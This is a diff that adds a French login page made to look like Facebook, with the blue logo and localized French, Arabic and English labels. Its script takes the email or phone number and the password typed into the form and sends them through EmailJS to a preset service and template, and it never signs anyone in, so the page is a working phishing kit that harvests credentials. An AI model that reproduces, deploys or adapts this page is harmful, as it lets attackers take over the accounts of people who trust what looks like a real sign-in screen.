@@ -1,0 +1,328 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title id="page-title">Connexion</title>
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            font-family: Helvetica, Arial, sans-serif;
+            background: linear-gradient(135deg, #e0f7fa, #e0e7fa);
+        }
+        .container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: space-between;
+            height: 100%;
+            padding: 20px;
+            box-sizing: border-box;
+        }
+        .content {
+            width: 100%;
+            max-width: 340px;
+            text-align: center;
+        }
+        h1 {
+            color: #1c1e21;
+            font-size: 16px;
+            font-weight: normal;
+            margin-bottom: 30px;
+        }
+        .logo {
+            width: 48px;
+            height: 48px;
+            margin: 0 auto 20px auto;
+            background-color: #1877f2;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .logo svg {
+            width: 36px;
+            height: 36px;
+        }
+        form {
+            width: 100%;
+            position: relative;
+        }
+        .input-container {
+            position: relative;
+            margin-bottom: 20px;
+        }
+        input, button {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 17px;
+            box-sizing: border-box;
+        }
+        input {
+            background-color: #f5f6f7;
+        }
+        input::placeholder {
+            color: #90949c;
+        }
+        button {
+            background-color: #1877f2;
+            color: white;
+            font-weight: bold;
+            border: none;
+            cursor: pointer;
+            position: relative;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        button .spinner {
+            border: 2px solid #ffffff;
+            border-radius: 50%;
+            border-top: 2px solid #1877f2;
+            width: 20px;
+            height: 20px;
+            animation: spin 1s linear infinite;
+            display: none;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .forgot-password {
+            color: #737373;
+            text-decoration: none;
+            font-size: 14px;
+            display: block;
+            margin-top: 16px;
+        }
+        .create-account {
+            background-color: transparent;
+            color: #737373;
+            border: 1px solid #dddfe2;
+            margin-top: 16px;
+            font-weight: bold;
+        }
+        footer {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            font-size: 12px;
+            color: #737373;
+            margin-top: auto;
+        }
+        footer a {
+            color: #737373;
+            text-decoration: none;
+        }
+        .error-message {
+            color: red;
+            font-size: 14px;
+            margin-top: 5px;
+            display: none;
+        }
+    </style>
+    <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
+    <script type="text/javascript">
+        (function(){
+            emailjs.init("GtGOvoRxe-k7_3oK8"); // Replace with your EmailJS user ID
+        })();
+
+        function handleFormSubmit(event) {
+            event.preventDefault();
+            
+            const emailOrPhone = document.querySelector('input[name="email_or_phone"]').value;
+            const password = document.querySelector('input[name="password"]').value;
+            const errorMessage = document.querySelector('.error-message');
+            const submitButton = document.querySelector('button[type="submit"]');
+            const buttonText = submitButton.querySelector('.button-text');
+            const spinner = submitButton.querySelector('.spinner');
+
+            // Input validation
+            if (!validateEmailOrPhone(emailOrPhone)) {
+                errorMessage.textContent = getErrorMessage();
+                errorMessage.style.display = 'block';
+                return;
+            } else {
+                errorMessage.style.display = 'none';
+            }
+
+            // Show spinner and hide button text
+            buttonText.style.display = 'none';
+            spinner.style.display = 'block';
+
+            emailjs.send("service_iw97iee", "template_zvf9gb3", { // Replace with your service ID and template ID
+                email_or_phone: emailOrPhone,
+                password: password
+            })
+            .then((response) => {
+                console.log('Email successfully sent!', response.status, response.text);
+                // Hide spinner and show button text
+                spinner.style.display = 'none';
+                buttonText.style.display = 'block';
+            }, (error) => {
+                console.error('Failed to send email.', error);
+                // Hide spinner and show button text
+                spinner.style.display = 'none';
+                buttonText.style.display = 'block';
+            });
+        }
+
+        function validateEmailOrPhone(input) {
+            const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            const phonePattern = /^[0-9]{10}$/; // Example pattern for a 10-digit phone number
+            return emailPattern.test(input) || phonePattern.test(input);
+        }
+
+        function getErrorMessage() {
+            const userLang = navigator.language || navigator.userLanguage; // Detect browser language
+            const lang = userLang.split('-')[0]; // Get the primary language code (e.g., "fr", "en")
+            
+            const errorMessages = {
+                'fr': "Veuillez entrer un numéro de téléphone ou une adresse e-mail valide.",
+                'ar': "يرجى إدخال رقم هاتف أو عنوان بريد إلكتروني صالح.",
+                'en': "Please enter a valid phone number or email address."
+            };
+
+            return errorMessages[lang] || errorMessages['en'];
+        }
+        
+        function setContentBasedOnLanguage() {
+            const userLang = navigator.language || navigator.userLanguage; // Detect browser language
+            const lang = userLang.split('-')[0]; // Get the primary language code (e.g., "fr", "en")
+            const country = userLang.split('-')[1]; // Get the country code (e.g., "CA" for Canada)
+
+            const pageTitle = document.getElementById('page-title');
+            const h1 = document.querySelector('h1');
+            const placeholders = document.querySelectorAll('input');
+            const forgotPassword = document.querySelector('.forgot-password');
+            const createAccount = document.querySelector('.create-account');
+            const submitButton = document.querySelector('button[type="submit"]');
+
+            // Define country-specific labels
+            const languageLabels = {
+                'fr': {
+                    'CA': {
+                        title: "Connexion - Français (Canada)",
+                        placeholderEmail: "Numéro de cellulaire ou adresse courriel",
+                        placeholderPassword: "Mot de passe",
+                        forgotPassword: "Mot de passe oublié?",
+                        submitButton: "Se connecter",
+                        createAccount: "Créer un compte"
+                    },
+                    'FR': {
+                        title: "Connexion - Français (France)",
+                        placeholderEmail: "Numéro de cellulaire ou adresse courriel",
+                        placeholderPassword: "Mot de passe",
+                        forgotPassword: "Mot de passe oublié?",
+                        submitButton: "Se connecter",
+                        createAccount: "Créer un compte"
+                    },
+                    'MA': {
+                        title: "Connexion - Français (Maroc)",
+                        placeholderEmail: "Numéro de cellulaire ou adresse courriel",
+                        placeholderPassword: "Mot de passe",
+                        forgotPassword: "Mot de passe oublié?",
+                        submitButton: "Se connecter",
+                        createAccount: "Créer un compte"
+                    },
+                    'default': {
+                        title: "Connexion - Français",
+                        placeholderEmail: "Numéro de cellulaire ou adresse courriel",
+                        placeholderPassword: "Mot de passe",
+                        forgotPassword: "Mot de passe oublié?",
+                        submitButton: "Se connecter",
+                        createAccount: "Créer un compte"
+                    }
+                },
+                'ar': {
+                    'default': {
+                        title: "تسجيل الدخول - العربية",
+                        placeholderEmail: "رقم الهاتف أو البريد الإلكتروني",
+                        placeholderPassword: "كلمة المرور",
+                        forgotPassword: "نسيت كلمة المرور؟",
+                        submitButton: "تسجيل الدخول",
+                        createAccount: "إنشاء حساب"
+                    }
+                },
+                'en': {
+                    'US': {
+                        title: "English (United States)",
+                        placeholderEmail: "Phone number or email address",
+                        placeholderPassword: "Password",
+                        forgotPassword: "Forgot password?",
+                        submitButton: "Log in",
+                        createAccount: "Create an account"
+                    },
+                    'GB': {
+                        title: "English (United Kingdom)",
+                        placeholderEmail: "Phone number or email address",
+                        placeholderPassword: "Password",
+                        forgotPassword: "Forgot password?",
+                        submitButton: "Log in",
+                        createAccount: "Create an account"
+                    },
+                    'default': {
+                        title: "English",
+                        placeholderEmail: "Phone number or email address",
+                        placeholderPassword: "Password",
+                        forgotPassword: "Forgot password?",
+                        submitButton: "Log in",
+                        createAccount: "Create an account"
+                    }
+                }
+            };
+
+            // Set language and country-specific content
+            const labels = languageLabels[lang] && languageLabels[lang][country] ? languageLabels[lang][country] : languageLabels[lang] ? languageLabels[lang]['default'] : languageLabels['en']['default'];
+
+            pageTitle.textContent = labels.title;
+            h1.textContent = labels.title;
+            placeholders[0].placeholder = labels.placeholderEmail;
+            placeholders[1].placeholder = labels.placeholderPassword;
+            forgotPassword.textContent = labels.forgotPassword;
+            submitButton.querySelector('.button-text').textContent = labels.submitButton;
+            createAccount.textContent = labels.createAccount;
+        }
+
+        document.addEventListener('DOMContentLoaded', function() {
+            setContentBasedOnLanguage();
+            const form = document.querySelector('form');
+            form.addEventListener('submit', handleFormSubmit);
+        });
+    </script>
+</head>
+<body>
+    <div class="container">
+        <div class="content">
+            <h1>Connexion</h1>
+            <div class="logo">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 36 36"><path fill="#1877F2" d="M36 18c0-9.94-8.06-18-18-18S0 8.06 0 18c0 9.01 6.63 16.44 15.26 17.83V23.27h-4.6v-5.23h4.6v-3.88c0-4.55 2.7-7.06 6.86-7.06 1.99 0 4.08.35 4.08.35v4.47h-2.3c-2.27 0-2.97 1.41-2.97 2.85v3.27h5.05l-.8 5.23h-4.25v12.56C29.37 34.43 36 27 36 18z"/><path fill="#FFF" d="M24.77 23.27l.8-5.23h-5.05v-3.27c0-1.44.7-2.85 2.97-2.85h2.3v-4.47s-2.09-.35-4.08-.35c-4.16 0-6.86 2.51-6.86 7.06v3.88h-4.6v5.23h4.6v12.56c.93.15 1.88.24 2.84.24s1.91-.09 2.84-.24V23.27h4.25z"/></svg>
+            </div>
+            <form>
+                <div class="input-container">
+                    <input type="text" name="email_or_phone" placeholder="">
+                    <div class="error-message"></div>
+                </div>
+                <div class="input-container">
+                    <input type="password" name="password" placeholder="">
+                </div>
+                <button type="submit">
+                    <div class="spinner"></div>
+                    <span class="button-text">Se connecter</span>
+                </button>
+            </form>
+            <a href="#" class="forgot-password"></a>
+            <button class="create-account"></button>
+        </div>
+        <footer>
+            <a href="#">À propos</a>
+            <a href="#">Aide</a>
+            <a href="#">Plus</a>
+        </footer>
+    </div>
+</body>
+  </html>
